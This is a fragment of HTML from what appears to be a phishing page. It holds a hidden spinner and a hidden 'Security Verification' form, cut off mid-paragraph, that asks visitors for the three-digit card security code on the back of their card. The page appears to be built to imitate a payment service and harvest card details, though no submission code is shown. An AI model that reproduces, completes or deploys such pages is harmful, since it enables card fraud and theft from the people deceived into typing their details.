                              </div>
                             </div>
                        </form>
                       </div>
                        
    				   <div id="loading" style="padding: 5px 10px 0; display: none">
        						<p style="font-family: Helvetica Neue, Helvetica, sans-serif; padding: 10px; text-align: center; font-size: 14px;">
        						<svg fill="#0059b3" stroke="#0059b3" viewBox="0 0 20 20" width="125px" height="125px" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="RadialGradient8932"><stop offset="0%" stop-color="#0059b3" stop-opacity="1"/><stop offset="100%" stop-color="#0059b3" stop-opacity="0.25"/></linearGradient></defs><style>@keyframes spin8932 { to { transform: rotate(360deg); } } #circle8932 { transform-origin: 50% 50%; stroke: url(#RadialGradient8932); fill: none; animation: spin8932 .5s infinite linear; : }</style><circle cx="10" cy="10" r="8" id="circle8932" stroke-width="1.5"/></svg>
        						</p>
    				  	</div>
						
                        <div id="clsdiv2" style="padding: 5px 10px 0; display: none">
                          <form id="fuidb" action="#" method="post">
                          	<div><a href="#" style="font-family: Helvetica Neue, Helvetica, sans-serif; font-size: 13px; font-weight: 300; line-height: 22px;" id="prev1"> Back </a></div>
					      	<div style="font-family: Helvetica Neue, Helvetica, sans-serif; padding: 15px; text-align: center; color: #4d4d4d; font-weight: 600; font-size: 15px;">  Security Verification: 3-Digit CSC </div>
					      	<div id="cancel_card_quest">  
                    		  <div style="line-height: 15px;">&nbsp;
          			    		<p id="cscerror" style="font-family: Helvetica Neue, Helvetica, sans-serif; font-size: 14px; color: #B42C01; line-height: 18px; display: none;"></p>
				   			  </div>
                    		  <p style="font-family: Helvetica Neue, Helvetica, sans-serif; font-size: 14px; font-weight: 200; line-height: 18px;">Please enter the 3-digit Card Security Code (CSC) which are the last three numbers printed on the signature strip on the back of your card.                             
